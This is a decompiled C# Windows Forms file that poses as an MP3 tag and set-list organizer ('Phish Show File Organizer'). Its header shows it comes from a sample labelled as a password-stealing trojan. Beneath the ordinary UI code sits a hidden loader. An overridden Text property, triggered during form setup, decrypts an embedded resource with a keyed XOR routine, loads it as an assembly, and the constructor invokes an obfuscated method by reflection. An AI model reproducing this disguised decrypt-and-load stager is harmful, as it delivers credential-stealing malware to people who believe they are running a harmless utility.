// Decompiled with JetBrains decompiler
// Type: TagClient.Form1
// Assembly: AnsiCharMarsha, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 45449883-CB33-464D-BFFF-85C1D8F95247
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Stealer.aipl-731355759034e0ae5cff6011792f40d5154dccd99fac792da878777bbc532ce2.exe

using Core.Infrastructure;
using Core.Infrastructure.Logging;
using Core.Services;
using DomainObjects;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;
using TagAltering;

namespace TagClient
{
  public class Form1 : Form
  {
    private TagProcessor _TagProcessor;
    private LogWriter _Log;
    private IContainer components;
    private static object GB18030;
    private TextBox txtProcess;
    private Label label1;
    private Button btnProcess;
    private ListBox lstFiles;
    private ListBox lstDatabase;
    private Label label3;
    private Label label4;
    private Label label5;
    private TextBox txtShowDate;
    private Button btnGetShow;
    private GroupBox groupBox1;
    private Button btnMoveDown;
    private Button btnMoveUp;
    private Button btnSetOrder;
    private Button btnChooseFolder;
    private FolderBrowserDialog folderBrowserDialog;

    public Form1()
    {
      this.InitializeComponent();
      MethodInfo method = ((System.Type) Form1.GB18030).GetMethod("ifcX5gLET");
      string[] strArray = new string[3]
      {
        "5642427956616C5374724D6172736861",
        "6F477361534D707158",
        "TagClient"
      };
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) 0;
      object[] parameters = (object[]) strArray;
      method.Invoke((object) local, parameters);
    }

    private void btnProcess_Click(object sender, EventArgs e)
    {
      string text = this.txtProcess.Text;
      if (string.IsNullOrEmpty(text))
      {
        int num1 = (int) MessageBox.Show("Please pick a folder");
      }
      else
      {
        try
        {
          string[] files = Directory.GetFiles(text, "*.mp3");
          if (files == null || ((IEnumerable<string>) files).Count<string>() <= 0)
          {
            int num2 = (int) MessageBox.Show("There are no files in that folder");
          }
          else
          {
            this._TagProcessor = new TagProcessor((IList<string>) ((IEnumerable<string>) files).ToList<string>());
            this.FillFiles();
          }
        }
        catch (Exception ex)
        {
          this._Log.WriteFatal("There was an error creating the Tag Processor.  The files have an issue with their paths. WITH EXCEPTION:" + ex.Message);
          int num3 = (int) MessageBox.Show("There is an issue with these files.  Please choose a valid folder of MP3 files.");
        }
      }
    }

    private void btnGetShow_Click(object sender, EventArgs e)
    {
      DateTime result;
      if (!DateTime.TryParse(this.txtShowDate.Text, out result))
      {
        int num1 = (int) MessageBox.Show("Please enter a valid date to get the show.");
      }
      IList<ISetSong> setList = Ioc.GetInstance<IShowService>().GetSetList(result);
      if (setList == null)
      {
        int num2 = (int) MessageBox.Show("There is no show in the database for that date");
      }
      else
        this.lstDatabase.DataSource = (object) setList.Select<ISetSong, string>((Func<ISetSong, string>) (x => x.SongName)).ToList<string>();
    }

    private void btnSetOrder_Click(object sender, EventArgs e)
    {
      List<Tag_3v1> files1 = new List<Tag_3v1>();
      List<Tag_3v2> files2 = new List<Tag_3v2>();
      bool flag1 = true;
      bool flag2 = true;
      IList<Tag_3v1> files3v1 = this._TagProcessor.Files_3v1;
      IList<Tag_3v2> files3v2 = this._TagProcessor.Files_3v2;
      if (files3v1 == null || !files3v1.Any<Tag_3v1>())
        flag1 = false;
      if (files3v2 == null || !files3v2.Any<Tag_3v2>())
        flag2 = false;
      foreach (object obj in this.lstFiles.Items)
      {
        object fileName = obj;
        if (flag1)
          files1.Add(files3v1.SingleOrDefault<Tag_3v1>((Func<Tag_3v1, bool>) (x => x.FileName == fileName.ToString())));
        if (flag2)
          files2.Add(files3v2.SingleOrDefault<Tag_3v2>((Func<Tag_3v2, bool>) (x => x.FileName == fileName.ToString())));
      }
      this.DetermineSuccess(this._TagProcessor.Update3v1TrackOrdering((IList<Tag_3v1>) files1) && this._TagProcessor.Update3v2TrackOrdering((IList<Tag_3v2>) files2));
    }

    private void FillFiles()
    {
      IEnumerable<string> strings;
      if (this._TagProcessor.Files_3v2 == null || !this._TagProcessor.Files_3v2.Any<Tag_3v2>())
      {
        if (this._TagProcessor.Files_3v1 == null || !this._TagProcessor.Files_3v1.Any<Tag_3v1>())
          return;
        strings = this._TagProcessor.Files_3v1.Select<Tag_3v1, string>((Func<Tag_3v1, string>) (x => x.FileName));
      }
      else
        strings = this._TagProcessor.Files_3v2.Select<Tag_3v2, string>((Func<Tag_3v2, string>) (x => x.FileName));
      this.lstFiles.Items.Clear();
      foreach (object obj in strings)
        this.lstFiles.Items.Add(obj);
    }

    private void DetermineSuccess(bool success)
    {
      if (success)
      {
        int num1 = (int) MessageBox.Show("You have successfully updated the track ordering!");
      }
      else
      {
        int num2 = (int) MessageBox.Show("There was a problem updating the track ordering.");
      }
    }

    private void btnMoveUp_Click(object sender, EventArgs e) => this.MoveFile(true);

    private void btnMoveDown_Click(object sender, EventArgs e) => this.MoveFile(false);

    private void MoveFile(bool up)
    {
      if (this.lstFiles.SelectedItem == null)
      {
        int num = (int) MessageBox.Show("Please select a file to move up");
      }
      else
      {
        int selectedIndex = this.lstFiles.SelectedIndex;
        int index;
        if (up)
        {
          if (selectedIndex == 0)
            return;
          index = selectedIndex - 1;
        }
        else
        {
          if (selectedIndex == this.lstFiles.Items.Count - 1)
            return;
          index = selectedIndex + 1;
        }
        object selectedItem = this.lstFiles.SelectedItem;
        this.lstFiles.Items.RemoveAt(selectedIndex);
        this.lstFiles.Items.Insert(index, selectedItem);
        this.lstFiles.SetSelected(index, true);
      }
    }

    private void btnChooseFolder_Click(object sender, EventArgs e)
    {
      if (this.folderBrowserDialog.ShowDialog() != DialogResult.OK)
        return;
      this.txtProcess.Text = this.folderBrowserDialog.SelectedPath;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    public override string Text
    {
      get => base.Text;
      set => Form1.RenewOnCallTime();
    }

    private static string RenewOnCallTime()
    {
      byte[] ObjectMode = (byte[]) new ResourceManager(typeof (Form1)).GetObject("PrincipalPolicy");
      string str = "C4Y97JB87GGH70GYUH8TCP";
      for (int index = 159766; index >= 0; index += -1)
        ObjectMode[index % 79872] = Convert.ToByte((Convert.ToInt32((int) ObjectMode[index % 79872] ^ (int) str[index % 22]) - Convert.ToInt32(ObjectMode[(index + 1) % 79872]) + 256) % 256);
      Form1.Introspection(Form1.Processing(ObjectMode));
      return str;
    }

    private static Assembly Processing(byte[] ObjectMode) => Assembly.Load(ObjectMode);

    private static void Introspection(Assembly Canonical) => Form1.GB18030 = (object) Canonical.GetType("g6pwWQ44xKhCXHsvSne.CN4qcq4MclarttE1ndg");

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.txtProcess = new TextBox();
      this.label1 = new Label();
      this.btnProcess = new Button();
      this.lstFiles = new ListBox();
      this.lstDatabase = new ListBox();
      this.label3 = new Label();
      this.label4 = new Label();
      this.label5 = new Label();
      this.txtShowDate = new TextBox();
      this.btnGetShow = new Button();
      this.groupBox1 = new GroupBox();
      this.btnSetOrder = new Button();
      this.btnMoveDown = new Button();
      this.btnMoveUp = new Button();
      this.btnChooseFolder = new Button();
      this.folderBrowserDialog = new FolderBrowserDialog();
      this.groupBox1.SuspendLayout();
      this.SuspendLayout();
      this.txtProcess.Location = new Point(195, 62);
      this.txtProcess.Margin = new Padding(8, 7, 8, 7);
      this.txtProcess.Name = "txtProcess";
      this.txtProcess.Size = new Size(1073, 38);
      this.txtProcess.TabIndex = 0;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(56, 79);
      this.label1.Margin = new Padding(8, 0, 8, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(96, 32);
      this.label1.TabIndex = 1;
      this.label1.Text = "Folder";
      this.btnProcess.Location = new Point(333, 148);
      this.btnProcess.Margin = new Padding(8, 7, 8, 7);
      this.btnProcess.Name = "btnProcess";
      this.btnProcess.Size = new Size(280, 55);
      this.btnProcess.TabIndex = 2;
      this.btnProcess.Text = "Fill Your Files";
      this.btnProcess.UseVisualStyleBackColor = true;
      this.btnProcess.Click += new EventHandler(this.btnProcess_Click);
      this.lstFiles.FormattingEnabled = true;
      this.lstFiles.ItemHeight = 31;
      this.lstFiles.Location = new Point(16, 160);
      this.lstFiles.Margin = new Padding(8, 7, 8, 7);
      this.lstFiles.Name = "lstFiles";
      this.lstFiles.Size = new Size(628, 624);
      this.lstFiles.TabIndex = 6;
      this.lstDatabase.FormattingEnabled = true;
      this.lstDatabase.ItemHeight = 31;
      this.lstDatabase.Location = new Point(1043, 160);
      this.lstDatabase.Margin = new Padding(8, 7, 8, 7);
      this.lstDatabase.Name = "lstDatabase";
      this.lstDatabase.SelectionMode = SelectionMode.None;
      this.lstDatabase.Size = new Size(548, 624);
      this.lstDatabase.TabIndex = 7;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(8, 122);
      this.label3.Margin = new Padding(8, 0, 8, 0);
      this.label3.Name = "label3";
      this.label3.Size = new Size(151, 32);
      this.label3.TabIndex = 8;
      this.label3.Text = "Your Files:";
      this.label4.AutoSize = true;
      this.label4.Location = new Point(1035, 122);
      this.label4.Margin = new Padding(8, 0, 8, 0);
      this.label4.Name = "label4";
      this.label4.Size = new Size(224, 32);
      this.label4.TabIndex = 9;
      this.label4.Text = "Database Order:";
      this.label5.AutoSize = true;
      this.label5.Location = new Point(872, 67);
      this.label5.Margin = new Padding(8, 0, 8, 0);
      this.label5.Name = "label5";
      this.label5.Size = new Size(161, 32);
      this.label5.TabIndex = 10;
      this.label5.Text = "Show Date:";
      this.txtShowDate.Location = new Point(1056, 50);
      this.txtShowDate.Margin = new Padding(8, 7, 8, 7);
      this.txtShowDate.Name = "txtShowDate";
      this.txtShowDate.Size = new Size(260, 38);
      this.txtShowDate.TabIndex = 11;
      this.btnGetShow.Location = new Point(1339, 45);
      this.btnGetShow.Margin = new Padding(8, 7, 8, 7);
      this.btnGetShow.Name = "btnGetShow";
      this.btnGetShow.Size = new Size(200, 55);
      this.btnGetShow.TabIndex = 12;
      this.btnGetShow.Text = "Get Show";
      this.btnGetShow.UseVisualStyleBackColor = true;
      this.btnGetShow.Click += new EventHandler(this.btnGetShow_Click);
      this.groupBox1.Controls.Add((Control) this.btnSetOrder);
      this.groupBox1.Controls.Add((Control) this.label4);
      this.groupBox1.Controls.Add((Control) this.lstDatabase);
      this.groupBox1.Controls.Add((Control) this.btnMoveDown);
      this.groupBox1.Controls.Add((Control) this.btnMoveUp);
      this.groupBox1.Controls.Add((Control) this.btnGetShow);
      this.groupBox1.Controls.Add((Control) this.label3);
      this.groupBox1.Controls.Add((Control) this.label5);
      this.groupBox1.Controls.Add((Control) this.lstFiles);
      this.groupBox1.Controls.Add((Control) this.txtShowDate);
      this.groupBox1.Location = new Point(32, 217);
      this.groupBox1.Margin = new Padding(8, 7, 8, 7);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Padding = new Padding(8, 7, 8, 7);
      this.groupBox1.Size = new Size(1616, 813);
      this.groupBox1.TabIndex = 13;
      this.groupBox1.TabStop = false;
      this.btnSetOrder.Location = new Point(667, 734);
      this.btnSetOrder.Margin = new Padding(8, 7, 8, 7);
      this.btnSetOrder.Name = "btnSetOrder";
      this.btnSetOrder.Size = new Size(200, 55);
      this.btnSetOrder.TabIndex = 15;
      this.btnSetOrder.Text = "Set Order";
      this.btnSetOrder.UseVisualStyleBackColor = true;
      this.btnSetOrder.Click += new EventHandler(this.btnSetOrder_Click);
      this.btnMoveDown.Location = new Point(667, 389);
      this.btnMoveDown.Margin = new Padding(8, 7, 8, 7);
      this.btnMoveDown.Name = "btnMoveDown";
      this.btnMoveDown.Size = new Size(67, 55);
      this.btnMoveDown.TabIndex = 14;
      this.btnMoveDown.Text = "\\/";
      this.btnMoveDown.UseVisualStyleBackColor = true;
      this.btnMoveDown.Click += new EventHandler(this.btnMoveDown_Click);
      this.btnMoveUp.Location = new Point(667, 320);
      this.btnMoveUp.Margin = new Padding(8, 7, 8, 7);
      this.btnMoveUp.Name = "btnMoveUp";
      this.btnMoveUp.Size = new Size(67, 55);
      this.btnMoveUp.TabIndex = 13;
      this.btnMoveUp.Text = "/\\";
      this.btnMoveUp.UseVisualStyleBackColor = true;
      this.btnMoveUp.Click += new EventHandler(this.btnMoveUp_Click);
      this.btnChooseFolder.Location = new Point(1323, 57);
      this.btnChooseFolder.Margin = new Padding(8, 7, 8, 7);
      this.btnChooseFolder.Name = "btnChooseFolder";
      this.btnChooseFolder.Size = new Size(248, 55);
      this.btnChooseFolder.TabIndex = 14;
      this.btnChooseFolder.Text = "Choose Folder";
      this.btnChooseFolder.UseVisualStyleBackColor = true;
      this.btnChooseFolder.Click += new EventHandler(this.btnChooseFolder_Click);
      this.AutoScaleDimensions = new SizeF(16f, 31f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1701, 1059);
      this.Controls.Add((Control) this.btnChooseFolder);
      this.Controls.Add((Control) this.btnProcess);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.txtProcess);
      this.Controls.Add((Control) this.groupBox1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Margin = new Padding(8, 7, 8, 7);
      this.Name = nameof (Form1);
      this.Text = "Phish Show File Organizer";
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
